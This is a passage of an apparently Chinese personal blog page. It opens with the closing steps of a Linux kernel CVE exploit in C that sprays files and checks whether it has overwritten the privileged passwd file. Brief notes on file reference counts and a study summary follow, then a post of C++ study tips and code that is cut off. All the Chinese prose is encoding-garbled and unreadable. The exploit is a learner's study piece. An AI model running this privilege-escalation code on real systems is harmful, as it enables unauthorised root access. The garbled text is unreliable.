class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">          err(<span class="number">1</span>, <span class="string">&quot;[-] read from file spray&quot;</span>);</span><br><span class="line">        overlapped = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (overlapped)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 13. finish exploitation</span></span><br><span class="line">  sleep(<span class="number">3</span>);</span><br><span class="line">  <span class="keyword">while</span> (run_write) &#123;sleep(<span class="number">1</span>);&#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[13] check whether we overwrite the privileged file\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!overlapped) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] no overlap found :(...\n&quot;</span>);</span><br><span class="line">    write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> xx = open(target, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">// check if user (hi) in the passwd</span></span><br><span class="line">    read(xx, buf, <span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(buf, <span class="string">&quot;hi&quot;</span>, <span class="number">2</span>))</span><br><span class="line">      write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] not successful : %s\n&quot;</span>, buf);</span><br><span class="line">      write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;sleep(<span class="number">1000</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…·ä½“è¿‡ç¨‹å¯ä»¥çœ‹è¿™ä¸¤å¼ å›¾</p>
<p><img src="https://img-blog.csdnimg.cn/e177f920084e4a77b2d4efaad6ee5614.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><img src="https://img-blog.csdnimg.cn/8baa8820341340a18143b5ed2731daa8.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è°ƒè¯•äº†åŠä¸ªæ™šä¸Šç»ˆäºæŠŠexpä¸­å…³äºfileç»“æ„ä½“å¼•ç”¨è®¡æ•°çš„é—®é¢˜è§£å†³äº†ï¼Œåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œä¸»çº¿ç¨‹å’Œæ‰€æœ‰çš„æ”¯çº¿ç¨‹å…±ç”¨ä¸€ä¸ª<code>struct files_struct</code>ç»“æ„ä½“ï¼Œæ‰€ä»¥åœ¨åˆ›å»ºçº¿ç¨‹çš„æ—¶å€™å¹¶ä¸ä¼šåƒåˆ›å»ºå­è¿›ç¨‹ä¸€æ ·ç»™æ‰€æœ‰çš„<code>file</code>çš„ç»“æ„ä½“çš„å¼•ç”¨è®¡æ•°<code>f_count</code>åŠ ä¸€ï¼Œä½†æ˜¯åªè¦åœ¨å­çº¿ç¨‹ä¸­ä½¿ç”¨äº†è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦<strong>ï¼ˆæ³¨æ„æ˜¯ä½¿ç”¨ï¼Œåªæœ‰ä½¿ç”¨äº†æ‰ä¼šåŠ ä¸€ï¼Œä½¿ç”¨å®Œè¿˜ä¼šå‡ä¸€ï¼‰</strong>ï¼Œå°±ä¼šç»™å¯¹åº”çš„<code>file</code>çš„<code>f_count</code>åŠ ä¸€ï¼Œè¡¨ç¤ºè¿™ä¸ªç»“æ„ä½“æ­£åœ¨è¢«ä½¿ç”¨ï¼Œæ‰€ä»¥åœ¨ä¸»çº¿ç¨‹closeè¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹åï¼Œå¯¹åº”çš„<code>file</code>å¹¶æ²¡æœ‰è¢«kfreeæ‰ï¼Œè€Œæ˜¯å¼•ç”¨è®¡æ•°å‡ä¸€ï¼Œä½†æ˜¯è¿™ä¸ªfileæŒ‡é’ˆæ˜¯åœ¨ä¸»çº¿ç¨‹ä¸­è¢«æ¸…é›¶çš„ã€‚è€Œåœ¨æŸä¸ªåœ°æ–¹è‚¯å®šè¿˜è®°å½•ç€è¿™ä¸ª<code>file</code>çš„æŒ‡é’ˆï¼Œä»¥ä¾¿åç»­kfreeã€‚</p>
<p>ä½†æ¯”è¾ƒå¥‡æ€ªçš„æ˜¯ä¸€ä¸ªè¿›ç¨‹åªæœ‰çº¿ç¨‹çš„æ—¶å€™ï¼Œå°±ç®—ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæ–‡ä»¶æè¿°ç¬¦å¯¹åº”çš„<code>file</code>çš„å¼•ç”¨è®¡æ•°è¿˜æ˜¯æ²¡æœ‰å˜çš„ã€‚</p>
<p>è¿™æ˜¯æ”¯çº¿ç¨‹ä½¿ç”¨writeæ­£åœ¨å†™å…¥æ—¶fileçš„æ ·å­ï¼Œå¯è§f_countä¸º2.</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221207011459177.png" alt="image-20221207011459177"></p>
<p>å½“å¼€å¯äº†æ”¯çº¿ç¨‹ä½†æ˜¯æ²¡æœ‰ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦æ—¶<code>file</code>çš„æ ·å­ï¼Œå¯è§f_countä¸º1</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221207011836162.png" alt="image-20221207011836162"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªcveçš„å­¦ä¹ æ€»ç®—å‘Šä¸€æ®µè½äº†ï¼Œé™¤äº†è®¾ç½®user namespaceæ²¡æ€ä¹ˆææ‡‚ä»¥å¤–å…¶ä»–åŸºæœ¬éƒ½æ˜ç™½äº†ï¼Œä¹Ÿç”¨expè°ƒè¯•æ‰“é€šäº†è‡ªå·±æ­çš„ç¯å¢ƒï¼Œæ€»çš„æ¥è¯´ç¡®å®å­¦åˆ°äº†å¥½å¤šã€‚å°¤å…¶æ˜¯<code>cross cache</code>å’Œ<code>drity cred</code>ï¼Œè¿˜æ·±å…¥çš„äº†è§£äº†æ–‡ä»¶æè¿°ç¬¦åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œäº†ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/08/c-study-tips/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/08/c-study-tips/" class="post-title-link" itemprop="url">c++ study tips</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-02-08 18:56:58 / ä¿®æ”¹æ—¶é—´ï¼š20:40:35" itemprop="dateCreated datePublished" datetime="2023-02-08T18:56:58+08:00">2023-02-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="c-study-tips"><a href="#c-study-tips" class="headerlink" title="c++ study tips"></a>c++ study tips</h1><p>è®°å½•ä¸€äº›å­¦ä¹ c++è¿‡ç¨‹ä¸­çš„å°é—®é¢˜æˆ–è€…æœ‰æ„æ€çš„ç‚¹ã€‚</p>
<h2 id="äº’ç›¸å¼•ç”¨"><a href="#äº’ç›¸å¼•ç”¨" class="headerlink" title="äº’ç›¸å¼•ç”¨"></a>äº’ç›¸å¼•ç”¨</h2><p>Aå’ŒBä¸¤ä¸ªå¤´æ–‡ä»¶äº’ç›¸å¼•ç”¨åœ¨c++ä¸­ä¼šæŠ¥é”™ï¼Œå› ä¸ºå¯èƒ½ä¼šå‘ç”Ÿè¶…å‰å¼•ç”¨é—®é¢˜ï¼Œè¶…å‰å¼•ç”¨æ˜¯æŒ‡ä½¿ç”¨äº†ä¸€ä¸ªåªå£°æ˜äº†ä½†æ²¡æœ‰å®šä¹‰çš„ç±»å‹æ¥å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿå°±æ˜¯è¿˜æ²¡æœ‰å®šä¹‰åªå£°æ˜äº†å°±ä½¿ç”¨å®ƒæ¥åˆ›å»ºå˜é‡ï¼Œç¼–è¯‘å™¨æ˜¯ä¸ä¼šå…è®¸é€šè¿‡çš„ã€‚</p>
<p>è§£å†³åŠæ³•å°±æ˜¯åœ¨Açš„å¤´æ–‡ä»¶ä¸­includeBï¼Œç„¶ååœ¨Açš„.hæ–‡ä»¶ä¸­å°±èƒ½æ­£å¸¸ä½¿ç”¨Bäº†ï¼Œä½†æ˜¯åœ¨Bçš„.hæ–‡ä»¶ä¸­ä¸èƒ½includeA,åªèƒ½å£°æ˜ä¸€ä¸ªclass A,ç„¶åä¹Ÿä¸èƒ½å£°æ˜ä¸€ä¸ªAçš„å¯¹è±¡æ¯”å¦‚<code>A a</code>,åªèƒ½å£°æ˜ä¸€ä¸ªAçš„æŒ‡é’ˆ<code>A *a</code>ã€‚ä½†æ˜¯åœ¨Bçš„.cppæ–‡ä»¶ä¸­å¯ä»¥includeAæ¥ä½¿ç”¨Açš„ä¸€äº›å£°æ˜ã€‚</p>
<p>è‡³äºä¸ºä»€ä¹ˆå¯ä»¥å£°æ˜æŒ‡é’ˆä½†ä¸èƒ½å£°æ˜å¯¹è±¡æ˜¯å› ä¸ºæ­¤æ—¶å¯¹Bæ¥è¯´Aåªå£°æ˜äº†æ²¡æœ‰å®šä¹‰ä¸çŸ¥é“Açš„å¤§å°æ‰€ä»¥æ²¡æœ‰åŠæ³•ç¡®å®šAçš„å¤§å°ï¼Œä½†æ˜¯æŒ‡é’ˆå§‹ç»ˆæ˜¯8ä¸ªå­—èŠ‚å¯ä»¥ç¡®å®šï¼Œæ‰€ä»¥å¯ä»¥å£°æ˜ä¸€ä¸ªæŒ‡é’ˆã€‚</p>
<p>ä¸å¾—ä¸è¯´c++æ˜¯çœŸçš„é¥¶å•Šã€‚</p>
<h2 id="æŒ‡é’ˆç±»"><a href="#æŒ‡é’ˆç±»" class="headerlink" title="æŒ‡é’ˆç±»"></a>æŒ‡é’ˆç±»</h2><p>é¡¾åæ€ä¹‰å°±æ˜¯æŸä¸€ä¸ªç±»çš„æŒ‡é’ˆç±»ï¼Œè¿™ä¸ªæŒ‡é’ˆç±»å¹¶ä¸æ˜¯ä¸€ä¸ªçœŸçš„æŒ‡é’ˆï¼Œè€Œæ˜¯ä¼šå°è£…è¿™ä¸ªç±»çš„ä¸€äº›æŒ‡é’ˆæ“ä½œï¼Œç„¶åé€šè¿‡è¿™ä¸ªæŒ‡é’ˆç±»æ¥æ“ä½œè¿™ä¸ªç±»çš„æ•°æ®ä¼šæ›´åŠ æ–¹ä¾¿ä¸€äº›ï¼Œæ¯”å¦‚å®¹å™¨å’Œè¿­ä»£å™¨å°±æ˜¯ç±»å’ŒæŒ‡é’ˆç±»ã€‚</p>
<h2 id="è¿”å›å±€éƒ¨å˜é‡"><a href="#è¿”å›å±€éƒ¨å˜é‡" class="headerlink" title="è¿”å›å±€éƒ¨å˜é‡"></a>è¿”å›å±€éƒ¨å˜é‡</h2><p>ä¼—æ‰€å‘¨çŸ¥å‡½æ•°ä¸èƒ½è¿”å›è‡ªå·±çš„å±€éƒ¨å˜é‡çš„åœ°å€ï¼Œä½†æ˜¯æ¯”è¾ƒæˆ‘æ¯”è¾ƒç–‘æƒ‘çš„æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥è¿”å›ä¸€ä¸ªå±€éƒ¨å¯¹è±¡ï¼Œç»è¿‡æŸ¥é˜…å¾—çŸ¥å½“è¿”å›ä¸€ä¸ªå±€éƒ¨å¯¹è±¡çš„æ—¶å€™å¹¶ä¸æ˜¯è¿”å›å±€éƒ¨å¯¹è±¡æœ¬èº«ï¼Œè€Œæ˜¯å°†è¿”å›å¯¹è±¡æ‹·è´åˆ°å‡½æ•°è°ƒç”¨ç‚¹ï¼Œæ‰€ä»¥è¿”å›çš„æ˜¯ä¸€ä¸ªå‰¯æœ¬ï¼Œè¿™ä¸ªå‰¯æœ¬çš„ä½œç”¨åŸŸä¸æ˜¯è¿™ä¸ªå‡½æ•°çš„ï¼Œè€Œæ˜¯è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„å‡½æ•°çš„ã€‚</p>
<h2 id="æ™ºèƒ½æŒ‡é’ˆåˆå§‹åŒ–"><a href="#æ™ºèƒ½æŒ‡é’ˆåˆå§‹åŒ–" class="headerlink" title="æ™ºèƒ½æŒ‡é’ˆåˆå§‹åŒ–"></a>æ™ºèƒ½æŒ‡é’ˆåˆå§‹åŒ–</h2><p>é»˜è®¤åˆå§‹åŒ–ä¸€ä¸ªæ™ºèƒ½æŒ‡é’ˆ,ç„¶åä½¿ç”¨ç¨‹åºå°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™çš„åŸå› æ˜¯é»˜è®¤åˆå§‹åŒ–çš„åªèƒ½æŒ‡é’ˆä¸­ä¿å­˜ç€ä¸€ä¸ªç©ºæŒ‡é’ˆï¼Œæ—¢ç„¶æ˜¯ç©ºæŒ‡é’ˆé‚£å°±è‚¯å®šä¸èƒ½ä½¿ç”¨ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    shared_ptr&lt;vector&lt;string&gt;&gt; word;</span><br><span class="line">    word-&gt;<span class="built_in">push_back</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> beg=word-&gt;<span class="built_in">begin</span>();</span><br><span class="line">    cout&lt;&lt;*beg&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨make_sharedè¿›è¡Œåˆå§‹åŒ–æ‰å¯ä»¥ä½¿ç”¨ï¼Œæ¯”å¦‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    shared_ptr&lt;vector&lt;string&gt;&gt; word= make_shared&lt;vector&lt;string&gt;&gt;();</span><br><span class="line">    word-&gt;<span class="built_in">push_back</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> beg=word-&gt;<span class="built_in">begin</span>();</span><br><span class="line">    cout&lt;&lt;*beg&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="éconstå¼•ç”¨ä¸ä¸´æ—¶å˜é‡é—®é¢˜"><a href="#éconstå¼•ç”¨ä¸ä¸´æ—¶å˜é‡é—®é¢˜" class="headerlink" title="éconstå¼•ç”¨ä¸ä¸´æ—¶å˜é‡é—®é¢˜"></a>éconstå¼•ç”¨ä¸ä¸´æ—¶å˜é‡é—®é¢˜</h2><p>é¦–å…ˆå¾—è¯´æ˜ä¸€ä¸‹ä¸´æ—¶å˜é‡å’Œå±€éƒ¨å˜é‡çš„åŒºåˆ«ï¼Œå±€éƒ¨å˜é‡æŒ‡åœ¨å‡½æ•°å†…æ˜¾ç¤ºå£°æ˜çš„å˜é‡ç§°ä¸ºå±€éƒ¨å˜é‡ï¼Œæ‰€ä»¥å±€éƒ¨å˜é‡éƒ½æ˜¯æœ‰å˜é‡åçš„ï¼Œç›¸å¯¹äºçš„ä¸´æ—¶å˜é‡è™½ç„¶ä¹Ÿæ˜¯å‡½æ•°å†…å£°æ˜çš„å˜é‡ä½†æ˜¯è¿™ä¸ªå˜é‡æ²¡æœ‰å˜é‡åçš„ï¼Œå±€éƒ¨å˜é‡å¾ˆå®¹æ˜“ç†è§£ï¼Œä¸´æ—¶å˜é‡é€šå¸¸åœ¨å‡½æ•°å‚æ•°ä¼ é€’å‘ç”Ÿç±»å‹è½¬æ¢ä»¥åŠå‡½æ•°è¿”å›å€¼æ—¶è¢«åˆ›å»ºã€‚</p>
<p>  å½“ä¸€ä¸ªå‡½æ•°çš„å½¢å‚ä¸ºéconstç±»å‹ï¼Œè€Œä¸€ä¸ªå‚æ•°ä»¥éconstä¼ å…¥ï¼Œç¼–è¯‘å™¨ä¸€èˆ¬ä¼šè®¤ä¸ºç¨‹åºå‘˜ä¼šåœ¨è¯¥å‡½æ•°é‡Œä¿®æ”¹è¯¥å‚æ•°ï¼Œè€Œä¸”è¯¥å‚æ•°è¿”å›åè¿˜ä¼šå‘æŒ¥ä½œç”¨ã€‚æ­¤æ—¶å¦‚æœä½ æŠŠä¸€ä¸ªä¸´æ—¶å˜é‡å½“æˆéconstå¼•ç”¨ä¼ è¿›æ¥ï¼Œç”±äºä¸´æ—¶å˜é‡çš„ç‰¹æ®Šæ€§ï¼Œç¨‹åºå‘˜æ— æ³•å¯¹æ”¹ä¸´æ—¶å˜é‡è¿›è¡Œæ“ä½œï¼ŒåŒæ—¶ä¸´æ—¶å˜é‡å¯èƒ½éšæ—¶ä¼šæ¶ˆå¤±ï¼Œä¿®æ”¹ä¸´æ—¶å˜é‡ä¹Ÿæ¯«æ— æ„ä¹‰ï¼Œå› æ­¤ï¼Œä¸´æ—¶å˜é‡ä¸èƒ½ä½œä¸ºéconstå¼•ç”¨ã€‚</p>
<p>æ¯”å¦‚ä¸‹é¢çš„ä»£ç ,uppercasify()å‡½æ•°çš„å‚æ•°æ˜¯stringç±»å‹ï¼Œä½†æ˜¯ä¼ å…¥çš„æ˜¯char *ç±»å‹ï¼Œæ‰€ä»¥ä¼šæŠŠchar *éšå¼è½¬åŒ–æˆstringå˜é‡ï¼Œè¿™ä¸ªstringå˜é‡å°±æ˜¯ä¸´æ—¶å˜é‡ï¼Œé‚£uppercasify()å‡½æ•°å†…éƒ¨å¦‚æœå¯¹stringæ“ä½œçš„åŒ–ä¹Ÿæ˜¯å¯¹ä¸´æ—¶å˜é‡stringè¿›è¡Œæ“ä½œè€Œä¸æ˜¯å¯¹subtleBookPlugå˜é‡è¿›è¡Œæ“ä½œï¼Œè¿™æ ·å°±ä¼šå¼•èµ·è¯¯æ“ä½œäº†ã€‚æ‰€ä»¥ä¸èƒ½ä½¿ç”¨éconstå¼•ç”¨æ¥æ”¶ä¸´æ—¶å˜é‡ï¼Œä¸ä»…æ²¡æœ‰æ„ä¹‰è¿˜ä¼šå¼•èµ·è¯¯æ“ä½œã€‚</p>
<p>ä½†æ˜¯è‚¯å®šéconstå¼•ç”¨å¯ä»¥æ¥æ”¶å±€éƒ¨å˜é‡çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uppercasify</span><span class="params">(<span class="built_in">string</span>&amp; str)</span> </span></span><br><span class="line"><span class="function"></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> subtleBookPlug[] = <span class="string">&quot;Effective C++&quot;</span>;</span><br><span class="line"></span><br><span class="line"> uppercasify(subtleBookPlug);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯é‚£å¥è¯ï¼Œc++çœŸçš„é¥¶ã€‚</p>
<h2 id="è®°å½•è‡ªå·±åˆ©ç”¨æ™ºèƒ½æŒ‡é’ˆå’Œæ ‡å‡†åº“å†™çš„å•è¯ç´¢å¼•ç¨‹åº"><a href="#è®°å½•è‡ªå·±åˆ©ç”¨æ™ºèƒ½æŒ‡é’ˆå’Œæ ‡å‡†åº“å†™çš„å•è¯ç´¢å¼•ç¨‹åº" class="headerlink" title="è®°å½•è‡ªå·±åˆ©ç”¨æ™ºèƒ½æŒ‡é’ˆå’Œæ ‡å‡†åº“å†™çš„å•è¯ç´¢å¼•ç¨‹åº"></a>è®°å½•è‡ªå·±åˆ©ç”¨æ™ºèƒ½æŒ‡é’ˆå’Œæ ‡å‡†åº“å†™çš„å•è¯ç´¢å¼•ç¨‹åº</h2><p>main.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;TextQuery.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">runQueries</span><span class="params">(fstream &amp;file)</span></span>&#123;</span><br><span class="line">    <span class="function">TextQuery <span class="title">textquery</span><span class="params">(file)</span></span>;</span><br><span class="line">    string user_string;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;plz input your word: &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!(cin&gt;&gt;user_string)||user_string==<span class="string">&quot;quit&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        QueryResult qr=textquery.<span class="built_in">query</span>(user_string);</span><br><span class="line">        <span class="built_in">print</span>(cout,qr)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fstream file;</span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;./2.txt&quot;</span>,ios::in);</span><br><span class="line">    <span class="keyword">if</span>(!file)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;open file fail&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">runQueries</span>(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TextQuery.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_TEXTQUERY_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_TEXTQUERY_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;QueryResult.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TextQuery</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">TextQuery</span>(std::fstream &amp;);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getword</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">QueryResult <span class="title">query</span><span class="params">(<span class="keyword">const</span> std::string)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::shared_ptr&lt;std::vector&lt;std::string&gt;&gt; file_context;</span><br><span class="line">    std::map&lt;std::string,std::shared_ptr&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;&gt; word;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_TEXTQUERY_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>TextQuery.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;TextQuery.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TextQuery::<span class="built_in">TextQuery</span>(std::fstream &amp;file) &#123;</span><br><span class="line">    std::string tmp;</span><br><span class="line">    <span class="keyword">int</span> cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;file_context=std::make_shared&lt;std::vector&lt;std::string&gt;&gt;();</span><br><span class="line">    <span class="keyword">while</span>(std::<span class="built_in">getline</span>(file,tmp))&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;file_context-&gt;<span class="built_in">push_back</span>(tmp);</span><br><span class="line">        <span class="function">std::istringstream <span class="title">line</span><span class="params">(tmp)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(line&gt;&gt;tmp)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;word.<span class="built_in">find</span>(tmp)==<span class="keyword">this</span>-&gt;word.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">auto</span> word_set= std::make_shared&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;();</span><br><span class="line">                word_set-&gt;<span class="built_in">insert</span>(cur);</span><br><span class="line">                <span class="keyword">this</span>-&gt;word.<span class="built_in">insert</span>(&#123;tmp,word_set&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">auto</span> value=<span class="keyword">this</span>-&gt;word[tmp];</span><br><span class="line">                value-&gt;<span class="built_in">insert</span>(cur);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span 